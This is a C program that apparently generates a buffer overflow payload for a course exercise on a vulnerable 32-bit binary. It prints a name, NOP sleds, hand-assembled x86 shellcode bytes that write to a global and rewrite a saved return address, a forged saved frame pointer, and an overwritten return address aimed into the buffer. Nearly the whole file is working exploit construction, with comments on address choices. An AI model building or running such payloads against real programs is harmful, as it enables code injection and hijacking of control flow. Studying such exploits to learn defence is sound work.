#include <stdio.h>
#include <string.h>
char attackString[] = "Byung Joo Shin"; //15 characters 
int main() {
	int i;
	char *p = attackString;
	for (i = 0; i < sizeof(attackString) - 1; i++) {
		putchar(*p);
		p++;
	}



		unsigned char test = 0x00;
		unsigned char nop = 0x90;
		//84 bytes total 
		for( i = 0; i < 10; i++){
			
			putchar(test);
		}

		for( i = 0; i < 14; i++){
			
			putchar(nop);
		}
			//need to inject this code 
		//80484c5:	89 e5                	mov    %esp,%ebp
 // 80484c7:	c6 05 24 a0 04 08 41 	movb   $0x41,0x804a024

		// Code to move return address r c7 45 8c 3f 85 04 08 	movl   $0x804853f,-0x74(%ebp)

		//15 bytes written to buffer 0x804a020
		
		unsigned char mov[7] = {0xc6, 0x05, 0x20, 0xa0, 0x04, 0x08, 0x41};
		for( i = 0; i < 7; i++){
			putchar(mov[i]);
		}
		//		c7 45 e8 3f 85 04 08	movl   $0x804853f,0x18(%ebp)

		//come back to ret  80484d6

		//unsigned char retaddr[7] = {0xc7, 0x45, 0xe8, 0xd6, 0x84, 0x04, 0x08};
		unsigned char retaddr[7] = {0xc7, 0x45, 0xe8, 0x3f, 0x85, 0x04, 0x08};


		for( i = 0; i < 7; i++){
			putchar(retaddr[i]);
		}

		unsigned char ret = 0xc3;
		putchar(ret);
		//code to switch a  
		
		
		
		for( i = 0; i < 45; i++){
			
			putchar(nop);
		}
		//66 bytes written 


	//next 4 bytes are value of char read 
		unsigned char charread = 0xcc;
		for( i = 0; i < 4; i++){
			putchar(charread);
		}



		unsigned char charCounter[] = {0x66, 0x00, 0x00, 0x00};
	//write the value of character counter
		for( i = 0; i < 4; i++){
			putchar(charCounter[i]);
		}
		unsigned char inc = 0x01;

		unsigned char null = 0x00;

    	//f0
		putchar(inc);
		putchar(null);
		putchar(null);
		putchar(null);

		//f4
		unsigned char f4[4]= {0x39, 0xc2, 0xf0, 0xb7};
		for( i = 0; i < 4; i++){
			putchar(f4[i]);
		}
		//ebp
		unsigned char ebp[4] = {0x18, 0xf3, 0xff, 0xbf};
		for( i = 0; i < 4; i++){
			putchar(ebp[i]);
		}

	


		//return address
		//fc 804856a --> Print to the name, 8048538 --> print to B
		//unsigned char 	ret[4] = {0x6a, 0x85, 0x04, 0x08};

		//1. change final injection program return address to  804853f, B -  8048538,804853f

		//2. Change address here to somewhere in the buffer
		unsigned char 	retbufaddr[4] = {0xa4, 0xa0, 0x04, 0x08};
		//unsigned char 	retbufaddr[4] = {0x38, 0x85, 0x04, 0x08};
		for( i = 0; i < 4; i++){
			putchar(retbufaddr[i]);
		}

		//fc
		/*
		unsigned char 	ret[4] = {0x10, 0x85, 0x04, 0x08};
		for( i = 0; i < 4; i++){
			putchar(ret[i]);
		}*/

		//30 0804a080 
		unsigned char thirty[4] = {0x80, 0xa0, 0x04, 0x08};
		for( i = 0; i < 4; i++){
			putchar(thirty[i]);
		}


		putchar(null);


		


		return 1;
	}